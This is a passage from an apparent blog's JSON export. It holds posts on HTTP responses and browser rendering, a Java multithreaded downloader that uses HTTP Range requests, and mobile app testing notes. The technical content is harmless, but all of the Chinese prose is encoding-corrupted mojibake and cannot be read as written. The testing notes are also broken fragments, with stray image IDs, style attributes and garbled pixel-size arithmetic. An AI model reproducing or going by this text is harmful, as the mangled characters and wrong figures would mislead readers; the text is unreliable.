8.æœåŠ¡å™¨å“åº”è¯·æ±‚æœåŠ¡æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„HTTPè¯·æ±‚åï¼ŒæŸ¥æ‰¾å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºï¼Œå¹¶è¿”å›å“åº”æŠ¥æ–‡ï¼Œå“åº”æŠ¥æ–‡ä¸­åŒ…æ‹¬ä¸€ä¸ªé‡è¦çš„ä¿¡æ¯â€”â€”çŠ¶æ€ç ã€‚çŠ¶æ€ç ç”±ä¸‰ä½æ•°å­—ç»„æˆï¼Œå…¶ä¸­æ¯”è¾ƒå¸¸è§çš„æ˜¯200 OKè¡¨ç¤ºè¯·æ±‚æˆåŠŸã€‚301è¡¨ç¤ºæ°¸ä¹…é‡å®šå‘ï¼Œå³è¯·æ±‚çš„èµ„æºå·²ç»æ°¸ä¹…è½¬ç§»åˆ°æ–°çš„ä½ç½®ã€‚åœ¨è¿”å›301çŠ¶æ€ç çš„åŒæ—¶ï¼Œå“åº”æŠ¥æ–‡ä¹Ÿä¼šé™„å¸¦é‡å®šå‘çš„urlï¼Œå®¢æˆ·ç«¯æ¥æ”¶åˆ°åå°†httpè¯·æ±‚çš„urlåšç›¸åº”çš„æ”¹å˜å†é‡æ–°å‘é€ã€‚404 not found è¡¨ç¤ºå®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºæ‰¾ä¸åˆ°ã€‚ 9. æœåŠ¡å™¨è¿”å›ç›¸åº”æ–‡ä»¶è¯·æ±‚æˆåŠŸåï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ç›¸åº”çš„HTMLæ–‡ä»¶ã€‚æ¥ä¸‹æ¥å°±åˆ°äº†é¡µé¢çš„æ¸²æŸ“é˜¶æ®µäº†ã€‚ äºŒã€é¡µé¢æ¸²æŸ“ç°ä»£æµè§ˆå™¨æ¸²æŸ“é¡µé¢çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šè§£æHTMLä»¥æ„å»ºDOMæ ‘ â€“&gt; æ„å»ºæ¸²æŸ“æ ‘ â€“&gt; å¸ƒå±€æ¸²æŸ“æ ‘ â€“&gt; ç»˜åˆ¶æ¸²æŸ“æ ‘ã€‚ DOMæ ‘æ˜¯ç”±HTMLæ–‡ä»¶ä¸­çš„æ ‡ç­¾æ’åˆ—ç»„æˆï¼Œæ¸²æŸ“æ ‘æ˜¯åœ¨DOMæ ‘ä¸­åŠ å…¥CSSæˆ–HTMLä¸­çš„styleæ ·å¼è€Œå½¢æˆã€‚æ¸²æŸ“æ ‘åªåŒ…å«éœ€è¦æ˜¾ç¤ºåœ¨é¡µé¢ä¸­çš„DOMå…ƒç´ ï¼Œåƒ&lt;head&gt;å…ƒç´ æˆ–displayå±æ€§å€¼ä¸ºnoneçš„å…ƒç´ éƒ½ä¸åœ¨æ¸²æŸ“æ ‘ä¸­ã€‚ åœ¨æµè§ˆå™¨è¿˜æ²¡æ¥æ”¶åˆ°å®Œæ•´çš„HTMLæ–‡ä»¶æ—¶ï¼Œå®ƒå°±å¼€å§‹æ¸²æŸ“é¡µé¢äº†ï¼Œåœ¨é‡åˆ°å¤–éƒ¨é“¾å…¥çš„è„šæœ¬æ ‡ç­¾æˆ–æ ·å¼æ ‡ç­¾æˆ–å›¾ç‰‡æ—¶ï¼Œä¼šå†æ¬¡å‘é€HTTPè¯·æ±‚é‡å¤ä¸Šè¿°çš„æ­¥éª¤ã€‚åœ¨æ”¶åˆ°CSSæ–‡ä»¶åä¼šå¯¹å·²ç»æ¸²æŸ“çš„é¡µé¢é‡æ–°æ¸²æŸ“ï¼ŒåŠ å…¥å®ƒä»¬åº”æœ‰çš„æ ·å¼ï¼Œå›¾ç‰‡æ–‡ä»¶åŠ è½½å®Œç«‹åˆ»æ˜¾ç¤ºåœ¨ç›¸åº”ä½ç½®ã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­å¯èƒ½ä¼šè§¦å‘é¡µé¢çš„é‡ç»˜æˆ–é‡æ’ã€‚","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"Download","slug":"DOWNLOAD","date":"2021-03-15T09:18:07.000Z","updated":"2021-04-15T15:26:11.540Z","comments":true,"path":"DOWNLOAD/","link":"","permalink":"https://blog.kayleh.top/DOWNLOAD/","excerpt":"","text":"Java å¤šçº¿ç¨‹ä¸‹è½½å™¨çš„è®¾è®¡ä¸å®ç°åº”ç”¨å¹¶å‘çš„åœºæ™¯æœ‰å¾ˆå¤šï¼Œä¸‹è½½æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„å¹¶å‘åœºæ™¯ã€‚ ä¸ºä»€ä¹ˆä¼šæƒ³å†™å¤šçº¿ç¨‹ä¸‹è½½å™¨å‘¢ï¼Ÿä¸çŸ¥é“ä½ ç”¨è¿‡ IDMï¼ˆInternet Download Managerï¼‰æ²¡ï¼Œæˆ‘åˆšä½¿ç”¨ IDM æ—¶ï¼Œå°±è¢«å®ƒçš„ä¸‹è½½æ–¹å¼å¸å¼•äº†ã€‚ ç”¨ IDM ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œèƒ½å¤Ÿç›´è§‚åœ°çœ‹åˆ°å®ƒçš„ä¸‹è½½è¿‡ç¨‹ï¼šå›ºå®šç”¨ N ä¸ªçº¿ç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œä¸€å¼€å§‹å…ˆå°†æ–‡ä»¶åˆ†ä¸º N æ®µï¼Œæ¯æ®µç”¨ä¸€ä¸ªçº¿ç¨‹ä¸‹è½½ï¼Œå½“æŸä¸€æ®µä¸‹è½½å®Œæˆä¹‹åï¼Œå¯¹åº”çš„çº¿ç¨‹å°±ç©ºé—²äº†ï¼Œæ­¤æ—¶æ€ä¹ˆåšå‘¢ï¼Ÿä»å‰©ä½™çš„ N - 1 æ®µä¸­å–å‡ºæœ€å¤§çš„ä¸€æ®µï¼Œä¸€åˆ†ä¸ºäºŒï¼Œè¿™æ ·å°±åˆæœ‰äº† N æ®µçš„æ•°æ®ï¼Œè®©ç©ºé—²çš„çº¿ç¨‹å»ä¸‹è½½æ–°åˆ’åˆ†å‡ºæ¥çš„è¿™ä¸€æ®µã€‚ æ¯å½“æœ‰ä¸€ä¸ªçº¿ç¨‹å®Œæˆä¸‹è½½ä»»åŠ¡æ—¶ï¼Œå°±ä¸æ–­ä»å‰©ä½™çš„éƒ¨åˆ†ä¸­åˆ’åˆ†å‡ºä¸€æ®µç»™å®ƒä¸‹è½½ï¼Œç›´åˆ°æ•´ä¸ªæ–‡ä»¶çš„æ‰€æœ‰éƒ¨åˆ†éƒ½ä¸‹è½½å®Œæ¯•ã€‚ å½“ç„¶ï¼Œæ–‡ä»¶å¹¶ä¸èƒ½è¢«æ— é™åœ°åˆ†æ®µï¼ŒIDM ä¼šè®¾å®šä¸€ä¸ªæ®µçš„é˜ˆå€¼ï¼Œå½“å‰©ä½™çš„æœ€å¤§æ®µå°äºè¿™ä¸ªé˜ˆå€¼çš„æ—¶å€™ï¼Œå°±ä¸å†åˆ†æ®µäº†ç»™ç©ºé—²çš„çº¿ç¨‹äº†ï¼Œåªç­‰å¾…æ´»åŠ¨ä¸­çš„æ‰€æœ‰çº¿ç¨‹ä¸‹è½½å®Œæ¯•ã€‚ img è¯´å®Œ IDM çš„ä¸‹è½½ç­–ç•¥ï¼Œæˆ‘ä»¬å¤§è‡´æœ‰äº†æ€è·¯ã€‚ä¸è¿‡ä¼˜ç§€çš„è½¯ä»¶ä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œè™½ç„¶æˆ‘ä»¬æƒ³å†™å‡ºåƒ IDM çš„ä¸‹è½½å™¨ï¼Œä½†è¿˜éœ€è¦ä»ç®€å•çš„å®ç°å¼€å§‹ï¼Œä¸æ–­è¿­ä»£ä¼˜åŒ–ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¸€å¼€å§‹é‡‡ç”¨çš„ç­–ç•¥æ˜¯ï¼šå›ºå®š N ä¸ªçº¿ç¨‹ï¼Œå¹¶å°†æ–‡ä»¶åˆ’åˆ†ä¸º N æ®µï¼Œæ¯ä¸ªçº¿ç¨‹è´Ÿè´£ä¸‹è½½ä¸€æ®µæ•°æ®ã€‚ å®ç°æ­¥éª¤åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼  é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯ï¼Œå¤šçº¿ç¨‹ä¸‹è½½æ–‡ä»¶åˆ©ç”¨çš„æ˜¯æ¯ä¸ªçº¿ç¨‹ä¸‹è½½æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå°±éœ€è¦ HTTP æœåŠ¡å™¨æ”¯æŒè¯·æ±‚éƒ¨åˆ†æ•°æ®ï¼Œæˆ–è€…è¯´æ–­ç‚¹ç»­ä¼ ï¼Œå› æ­¤ç¬¬ä¸€æ­¥éœ€è¦åˆ¤æ–­ç›®æ ‡æ–‡ä»¶æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼ ã€‚ HTTP è¯·æ±‚å¤´ä¸­æœ‰ä¸€ä¸ª Range å­—æ®µï¼Œå¯ä»¥ç”¨æ¥æŒ‡å®šè¦è¯·æ±‚çš„æ•°æ®èŒƒå›´ï¼Œä¾‹å¦‚æˆ‘ä»¬è¦è¯·æ±‚ä»ç¬¬ 10 å­—èŠ‚åˆ°ç¬¬ 20 å­—èŠ‚çš„æ•°æ®ï¼Œå¯ä»¥å°†è¯¥å­—æ®µå†™ä¸º Range:bytes=10-20ã€‚ ç›¸åº”çš„ï¼Œå¦‚æœ HTTP æœåŠ¡å™¨æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œé‚£ä¹ˆå¯¹äºæŒ‡å®šäº† Range å­—æ®µçš„è¯·æ±‚ï¼Œä¼šè¿”å› 206 çŠ¶æ€ç ã€‚ æˆ‘ä»¬ç”¨ Curl æ¥æµ‹è¯•ä¸€ä¸‹ï¼š curl -I --header &quot;Range: bytes=0-&quot; http://mirrors.163.com/debian/ls-lR.gz å¾—åˆ°çš„å“åº”ï¼š HTTP/1.1 206 Partial Content Server: nginx Date: Wed, 25 Apr 2018 02:57:56 GMT Content-Type: application/octet-stream Content-Length: 15316619 Connection: keep-alive Last-Modified: Mon, 23 Apr 2018 14:38:44 GMT ETag: &quot;5addeff4-e9b68b&quot; Content-Range: bytes 0-15316618/15316619 æˆ‘ä»¬è®¾ç½® Range: bytes=0- ï¼Œè¡¨ç¤ºè¯·æ±‚ä»ç¬¬ 0 å­—èŠ‚åˆ°æœ€åä¸€å­—èŠ‚çš„æ•°æ®ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦æŒ‡å®šè¯¥å­—æ®µå‘¢ï¼Ÿè¿™æ˜¯å‡ºäºä¸¤æ–¹é¢çš„åŸå› ï¼šä¸€æ˜¯åˆ¤æ–­å“åº”çš„çŠ¶æ€ç æ˜¯å¦ä¸º 206ï¼ŒäºŒæ˜¯å¾—åˆ°æ–‡ä»¶çš„å¤§å°ã€‚ å¦‚æœæœåŠ¡å™¨æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡‡ç”¨å¤šçº¿ç¨‹è¿›è¡Œä¸‹è½½ï¼Œå¦‚æœä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œå°±é‡‡ç”¨å•çº¿ç¨‹ä¸‹è½½ã€‚ æ–‡ä»¶åˆ†æ®µ æˆ‘ä»¬å¾—åˆ°äº†æ–‡ä»¶çš„å¤§å° fileSizeï¼Œå°†å…¶åˆ†ä¸º N æ®µï¼Œåˆ™æ¯ä¸€æ®µçš„å¤§å°ä¸º fileSize / Nï¼Œç”±äºæ–‡ä»¶é€šå¸¸ä¸ä¼šæ­£å¥½è¢«åˆ†ä¸º N æ®µï¼Œå› æ­¤æœ€åä¸€æ®µå°±ç­‰äºå‰©ä½™çš„éƒ¨åˆ†çš„å¤§å°ã€‚ æˆ‘ä»¬ç”¨ä¸€ä¸ªæ•°ç»„ endPoint æ¥å­˜æ”¾æ¯ä¸€æ®µçš„èµ·æ­¢ä½ç½®ï¼Œä¾‹å¦‚ä¸€ä¸ª 10 B çš„æ–‡ä»¶ï¼Œèµ·æ­¢èŒƒå›´æ˜¯ 0~9ï¼Œå¦‚æœåˆ†ä¸º 3 æ®µä¸‹è½½ï¼Œé‚£ä¹ˆ endPoint = {0, 3, 6, 10}ï¼Œå¯¹æ¯æ®µæ¥è¯´æ˜¯å·¦é—­å³å¼€åŒºé—´ã€‚ è§£é‡Šï¼šå¯¹äºç¬¬ i æ®µï¼ˆi ä» 0 å¼€å§‹ï¼‰æ¥è¯´ï¼Œä» endPoint[i] å¼€å§‹ä¸‹è½½ï¼Œåœ¨ endPoint[i + 1] - 1 å¤„åœæ­¢ã€‚åŒç†ï¼Œå¯¹ç¬¬ i + 1 æ®µæ¥è¯´ï¼Œä» endPoint[i + 1] å¼€å§‹ï¼Œåœ¨ endPoint[i + 2] - 1 å¤„åœæ­¢ã€‚ åˆ›å»ºä¸‹è½½çº¿ç¨‹ æˆ‘ä»¬ä¸ºæ¯ä¸€æ®µåˆ›å»ºä¸€ä¸ªä¸‹è½½çº¿ç¨‹è¿›è¡Œä¸‹è½½ï¼Œæ¯ä¸€æ®µéƒ½å­˜æ”¾åœ¨ä¸€ä¸ªå•ç‹¬çš„ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ ä¸‹è½½çº¿ç¨‹éœ€è¦åšçš„äº‹æƒ…å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š è®¾ç½®è¯·æ±‚å¤´çš„ Range å­—æ®µæ¥æŒ‡å®šè¯·æ±‚èŒƒå›´ è®¾ç½®è¶…æ—¶æ—¶é—´ è¿æ¥ HTTP æœåŠ¡å™¨ åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼ˆç¬¬ä¸€æ¬¡ä¸‹è½½è¯¥æ®µï¼‰ è¯»å–æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼Œå†™å…¥åˆ°ä¸´æ—¶æ–‡ä»¶ï¼Œç›´åˆ°è¯»å–çš„å­—èŠ‚æ•°ç­‰äºè¯¥æ®µçš„å¤§å° å…³é—­ä¸´æ—¶æ–‡ä»¶ ä¸Šé¢æ˜¯é¡ºåˆ©ä¸‹è½½çš„æµç¨‹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨å‡ºç°ä¸‹åˆ—é—®é¢˜æ—¶è¿›è¡Œé‡è¯•ï¼š å¦‚æœè¿æ¥æ—¶é—´æˆ–è¯»å–æ—¶é—´è¶…æ—¶ ä¸´æ—¶æ–‡ä»¶è¯»å†™å‡ºé”™ è¿™æ ·åˆæœ‰é—®é¢˜äº†ï¼Œå¯¹äºè¯¥çº¿ç¨‹æ¥è¯´ï¼Œé‡è¯•æ—¶æ˜¯é‡æ–°ä¸‹è½½æ•´æ®µï¼Œè¿˜æ˜¯æ¥ç€ä¸‹è½½å‰©ä½™éƒ¨åˆ†ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæœ€å¥½å°±æ˜¯æ¥ç€ä¸‹è½½è¿˜æ²¡ä¸‹å®Œçš„é‚£éƒ¨åˆ†ï¼Œé‚£å¦‚ä½•å®ç°å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆåšï¼šæ¯ä¸ªçº¿ç¨‹ä¿å­˜è‡ªå·±è´Ÿè´£éƒ¨åˆ†çš„èµ·æ­¢ä½ç½®ï¼Œåœ¨åˆšå¯åŠ¨çº¿ç¨‹æ—¶ï¼Œèµ·æ­¢ä½ç½®å°±æ˜¯æ®µçš„èµ·æ­¢ä½ç½®ï¼Œåˆ›å»ºä¸´æ—¶æ–‡ä»¶å†™å‡ºå·²ä¸‹è½½çš„æ•°æ®ã€‚åœ¨ä¸‹è½½æ•°æ®æ—¶ï¼Œå®æ—¶æ›´æ–°çº¿ç¨‹çš„èµ·å§‹ä½ç½®ä¸ºå½“å‰å·²ä¸‹è½½å­—èŠ‚çš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œå½“å‡ºé”™éœ€è¦é‡è¯•æ—¶ï¼Œç›´æ¥ä»è¯¥ä½ç½®å¼€å§‹ï¼Œå¹¶ä¸”å†™å‡ºåˆ°ä¹‹å‰åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ åˆ›å»ºç›‘è§†çº¿ç¨‹ æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå®ˆæŠ¤çº¿ç¨‹ï¼Œè´Ÿè´£ç›‘è§†æ–‡ä»¶çš„ä¸‹è½½è¿›åº¦ã€ä¸‹è½½é€Ÿåº¦ã€å½“å‰æ´»è·ƒçº¿ç¨‹æ•°ï¼Œåœ¨å„çº¿ç¨‹ä¸‹è½½ç»“æŸåï¼Œé€šçŸ¥ä¸»çº¿ç¨‹åšä¸‹ä¸€æ­¥å¤„ç†ã€‚ å¤„ç†ä¸´æ—¶æ–‡ä»¶ å½“ä¸»çº¿ç¨‹æ”¶åˆ°é€šçŸ¥ï¼Œæ‰€æœ‰éƒ¨åˆ†éƒ½ä¸‹è½½å®Œæˆæ—¶ï¼Œå°±éœ€è¦å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡Œæ¸…ç†ã€‚ å¦‚æœæ˜¯å¤šçº¿ç¨‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆéœ€è¦å¯¹å¤šä¸ªä¸´æ—¶æ–‡ä»¶è¿›è¡Œåˆå¹¶ã€‚ å¦‚æœæ˜¯å•çº¿ç¨‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œåˆ™å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚ å…·ä½“å®ç°è¿™é‡Œç»™å‡ºç¨‹åºçš„è½®å»“ï¼Œè¿›è¡Œæ•´ä½“ä¸Šçš„ä»‹ç»ï¼Œå®Œæ•´çš„æºç å¯æŸ¥çœ‹ Githubï¼šhttps://github.com/wrayzheng/java-multithread-downloader public class HttpDownloader { private boolean resumable; private URL url; private File localFile; private int[] endPoint; private Object waiting = new Object(); private AtomicInteger downloadedBytes = new AtomicInteger(0); private AtomicInteger aliveThreads = new AtomicInteger(0); private boolean multithreaded = true; private int fileSize = 0; private int THREAD_NUM = 5; private int TIME_OUT = 5000; private final int MIN_SIZE = 2 &lt;&lt; 20; public HttpDownloader(String Url, String localPath) throws MalformedURLException {...} public HttpDownloader(String Url, String localPath, int threadNum, int timeout) throws MalformedURLException {...} //å¼€å§‹ä¸‹è½½æ–‡ä»¶ public void get() throws IOException {...} //æ£€æµ‹ç›®æ ‡æ–‡ä»¶æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œä»¥å†³å®šæ˜¯å¦å¼€å¯å¤šçº¿ç¨‹ä¸‹è½½æ–‡ä»¶çš„ä¸åŒéƒ¨åˆ† public boolean supportResumeDownload() throws IOException {...} //ç›‘æµ‹ä¸‹è½½é€Ÿåº¦åŠä¸‹è½½çŠ¶æ€ï¼Œä¸‹è½½å®Œæˆæ—¶é€šçŸ¥ä¸»çº¿ç¨‹ public void startDownloadMonitor() {...} //å¯¹ä¸´æ—¶æ–‡ä»¶è¿›è¡Œåˆå¹¶æˆ–é‡å‘½å public void cleanTempFile() throws IOException {...} //åˆå¹¶å¤šçº¿ç¨‹ä¸‹è½½äº§ç”Ÿçš„å¤šä¸ªä¸´æ—¶æ–‡ä»¶ public void merge() {...} //ä¸€ä¸ªä¸‹è½½çº¿ç¨‹è´Ÿè´£ä¸‹è½½æ–‡ä»¶çš„æŸä¸€éƒ¨åˆ†ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªåŠ¨é‡è¯•ï¼Œç›´åˆ°ä¸‹è½½å®Œæˆ class DownloadThread extends Thread { private int id; private int start; private int end; private OutputStream out; public DownloadThread(int id, int start, int end) {...} //ä¿è¯æ–‡ä»¶çš„è¯¥éƒ¨åˆ†æ•°æ®ä¸‹è½½å®Œæˆ @Override public void run() {...} //ä¸‹è½½æ–‡ä»¶æŒ‡å®šèŒƒå›´çš„éƒ¨åˆ† public boolean download() {...} } } è¿™é‡Œå°† DownloadThread å®šä¹‰ä¸º HttpDownloader çš„å†…éƒ¨ç±»ï¼Œè¿™æ˜¯å› ä¸ºä¸€ä¸ª HttpDownloader å®ä¾‹å¯¹åº”ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½ä»»åŠ¡ï¼Œè¯¥å®ä¾‹ä¸­å­˜æ”¾äº†è¯¥ä»»åŠ¡çš„å„ç§æ•°æ®ï¼Œè€Œä¸‹è½½çº¿ç¨‹æ˜¯ä¸è¯¥ä»»åŠ¡æ˜¯å…³è”çš„ï¼Œéœ€è¦ç”¨åˆ°è¿™äº›æ•°æ®ï¼Œå› æ­¤å®šä¹‰ä¸ºå†…éƒ¨ç±»å¯ä»¥ç›´æ¥å…±äº«è¿™äº›æ•°æ®ï¼Œä»è€Œé¿å…è¿‡å¤šçš„å‚æ•°ä¼ é€’å’Œå­˜å‚¨ã€‚ è¦ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª HttpDownloader å®ä¾‹ï¼Œå¿…é¡»ä¼ å…¥çš„å‚æ•°æ˜¯ç›®æ ‡æ–‡ä»¶ URL å’Œæœ¬åœ°çš„å­˜å‚¨ä½ç½®ï¼Œå¯é€‰å‚æ•°æ˜¯çº¿ç¨‹æ•°å’Œè¶…æ—¶æ—¶é—´ã€‚ HttpDownloader çš„å…¥å£æ–¹æ³•ä¸º get()ï¼Œå®ƒçš„å·¥ä½œå¦‚ä¸‹ï¼š è°ƒç”¨ supportResumeDownload() æ–¹æ³•åˆ¤æ–­ç›®æ ‡æ–‡ä»¶æ˜¯å¦æ”¯æŒæ–­ç‚¹ç»­ä¼ ä»¥åŠæ˜¯å¦å¤§äºè®¾å®šçš„æ–‡ä»¶æœ€å°å€¼ï¼Œä»¥å†³å®šæ˜¯å¦é‡‡å–å¤šçº¿ç¨‹çš„ä¸‹è½½æ–¹å¼ï¼› è®¡ç®—æ¯ä¸€æ®µçš„èµ·æ­¢ä½ç½®ï¼Œå­˜å…¥ endPointï¼› åˆ›å»º DownloadThread çº¿ç¨‹è¿›è¡Œä¸‹è½½ï¼› è°ƒç”¨ startDownloadMonitor() æ–¹æ³•å¯åŠ¨ç›‘è§†çº¿ç¨‹ï¼› ç­‰å¾…æ–‡ä»¶ä¸‹è½½å®Œæ¯•ï¼› è°ƒç”¨ cleanTempFile() å¤„ç†ä¸´æ—¶æ–‡ä»¶ï¼› è¾“å‡ºç»“æŸä¿¡æ¯ã€‚ å†æ¥ä»‹ç»ä¸€ä¸‹ DownloadThreadï¼Œå®ƒçš„å…¥å£æ–¹æ³•æ˜¯ run()ï¼Œå·¥ä½œå¦‚ä¸‹ï¼š è°ƒç”¨ download() æ–¹æ³•ä¸‹è½½æŒ‡å®šéƒ¨åˆ†çš„æ•°æ®; å¦‚æœæˆåŠŸï¼Œåˆ™çº¿ç¨‹ç»“æŸï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å›åˆ°ä¸Šä¸€æ­¥ã€‚ ä¸‹è½½æµ‹è¯•å¯¹äºå•ä¸ªè¿æ¥é™é€Ÿçš„æœåŠ¡å™¨ï¼Œå¤šçº¿ç¨‹ä¸‹è½½æ‰èƒ½ä½“ç°å…¶ä¼˜åŠ¿ï¼Œå¦‚æœæœåŠ¡å™¨æœ¬èº«ä¸å¯¹è¿æ¥é™é€Ÿï¼Œé‚£ä¹ˆå•ä¸ªè¿æ¥ä¹Ÿèƒ½æ¥è¿‘å¸¦å®½ä¸Šé™ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œå¯¹äºå•ä¸ªè¿æ¥é€Ÿåº¦è¿œå°äºå¸¦å®½æ—¶ï¼Œå•çº¿ç¨‹ä¸å¤šçº¿ç¨‹çš„å¯¹æ¯”ã€‚ é¦–å…ˆæ˜¯å•ä¸ªçº¿ç¨‹è¿›è¡Œä¸‹è½½ï¼š img ç”¨æ—¶ 54.133 ç§’ï¼Œå¹³å‡ä¸‹è½½é€Ÿåº¦ 42 KB/sã€‚ å¼€å¯ 10 ä¸ªçº¿ç¨‹è¿›è¡Œä¸‹è½½ï¼š img ç”¨æ—¶ 10.144 ç§’ï¼Œå¹³å‡ä¸‹è½½é€Ÿåº¦ 228 KB/sã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç›¸æ¯”å•çº¿ç¨‹ä¸‹è½½ï¼Œå¼€å¯å¤šçº¿ç¨‹ä¹‹åä¸‹è½½é€Ÿåº¦æœ‰äº†å·¨å¤§çš„æå‡ã€‚ åœ¨å®é™…ä¸‹è½½æ—¶ï¼Œæ ¹æ®ç½‘ç»œçŠ¶å†µä¸åŒï¼Œè®¾ç½®ä¸åŒçš„è¶…æ—¶æ—¶é—´ï¼Œå¯¹ä¸‹è½½é€Ÿåº¦ä¹Ÿæœ‰ä¸å°çš„å½±å“ã€‚å¦‚æœè¶…æ—¶æ—¶é—´è®¾ç½®è¿‡å°ï¼Œä¼šå¯¼è‡´çº¿ç¨‹é¢‘ç¹å»ºç«‹è¿æ¥ï¼Œè€Œå»ºç«‹è¿æ¥æ˜¯ç›¸å¯¹è€—æ—¶çš„æ“ä½œï¼Œå¯¼è‡´ä¸‹è½½æ•ˆç‡ä½ä¸‹ï¼›å¦‚æœè¶…æ—¶æ—¶é—´è®¾ç½®è¿‡é•¿ï¼Œå¯èƒ½è¿æ¥å·²ç»å¤±æ•ˆï¼Œè€Œå®¢æˆ·ç«¯å´é•¿æ—¶é—´ç­‰å¾…ï¼Œæ— è°“åœ°æ¶ˆè€—æ—¶é—´ã€‚ ç»“è¯­è¿™æ˜¯ä¸€ä¸ªæœ€åŸºæœ¬çš„å¤šçº¿ç¨‹ä¸‹è½½å™¨çš„å®ç°ï¼Œå°†æ–‡ä»¶åˆ’åˆ†ä¸ºå›ºå®šçš„ N æ®µï¼Œåˆ†é…ç»™ N ä¸ªçº¿ç¨‹ä¸‹è½½ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹ä¸‹è½½å®Œæˆåï¼Œè¯¥çº¿ç¨‹å°±éšä¹‹ç»“æŸäº†ï¼Œæ²¡æœ‰è¢«å†æ¬¡åˆ©ç”¨ã€‚ ä¹‹åæˆ‘ä¼šå¯¹è¯¥ç¨‹åºåšè¿›ä¸€æ­¥çš„ä¼˜åŒ–ï¼Œä¸€æ–¹é¢ä¼šé‡‡å–å’Œ IDM ç±»ä¼¼çš„ä¸‹è½½ç­–ç•¥ï¼Œè¿›ä¸€æ­¥æé«˜ä¸‹è½½æ•ˆç‡ï¼Œå¦ä¸€æ–¹é¢ï¼Œä¹Ÿä¼šåœ¨åŠŸèƒ½å’Œé²æ£’æ€§æ–¹é¢è¿›è¡ŒåŠ å¼ºï¼Œå®Œå–„å¼‚å¸¸å¤„ç†ã€‚","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"app test","slug":"app-test","date":"2021-03-03T08:49:54.000Z","updated":"2021-04-11T17:11:28.482Z","comments":true,"path":"app-test/","link":"","permalink":"https://blog.kayleh.top/app-test/","excerpt":"","text":"ç§»åŠ¨ç«¯æµ‹è¯•è¦ç‚¹å®‰è£…æµ‹è¯•ã€å¸è½½æµ‹è¯•UIæµ‹è¯•1615137765268\" style=\"zoom:50%; åŠŸèƒ½æµ‹è¯•1615133542830\" style=\"zoom:50%; è¿è¡Œapp1615134963504 åº”ç”¨çš„å‰åå°åˆ‡æ¢1615134979917 å…ç™»é™†1615135150085 æ•°æ®æ›´æ–°1615135195319 ç¦»çº¿æµè§ˆ1615135394779 appæ›´æ–°1615135456332 å®šä½ã€ç…§ç›¸æœºæœåŠ¡1615135477942 æ—¶é—´æµ‹è¯•1615135504852 PUSHæµ‹è¯• æ€§èƒ½æµ‹è¯•1615136053666\" style=\"zoom:50%; äº¤å‰äº‹ä»¶æµ‹è¯•1615136213904 ä¾‹å¦‚ï¼šå¾®ä¿¡è§†é¢‘å’Œæ¥ç”µ å…¼å®¹æ€§æµ‹è¯•å‡çº§ã€æ›´æ–°æµ‹è¯•1615136698549\" style=\"zoom:50%; ç”¨æˆ·ä½“éªŒæµ‹è¯•1615136880550\" style=\"zoom:50%; ç¡¬ä»¶ç¯å¢ƒæµ‹è¯•1615136938152\" style=\"zoom:50%; æ¥å£æµ‹è¯•å®¢æˆ·ç«¯æ•°æ®åº“æµ‹è¯•1615137461874 å®‰å…¨æµ‹è¯•1615137928157\" style=\"zoom:33%; Androidæµ‹è¯•Androidç³»ç»Ÿçš„åŸºæœ¬ç»“æ„ linuxå†…æ ¸å±‚ Androidå‡½æ•°åº“å’ŒAndroidè¿è¡Œçš„è™šæ‹Ÿæœº åº”ç”¨ç¨‹åºæ¡†æ¶ åº”ç”¨ç¨‹åº 1615140074133 æµ‹è¯•æœ¯è¯­ ç³» ç»Ÿç¢ç‰‡åŒ– å±å¹•å°ºå¯¸ åˆ†è¾¨ç‡ åƒç´  ç½‘ç»œåˆ¶å¼ 1615140333141\" style=\"zoom:33%; åƒç´ ä¸€ä½=8å­—èŠ‚ å¤§å° 1156*634 = 732904 732904/8=9291613=92K 9291613/1024=89. ç½‘ç»œåˆ¶å¼1615142556664\" style=\"zoom: 50%; Androidå››å¤§ç»„ä»¶ 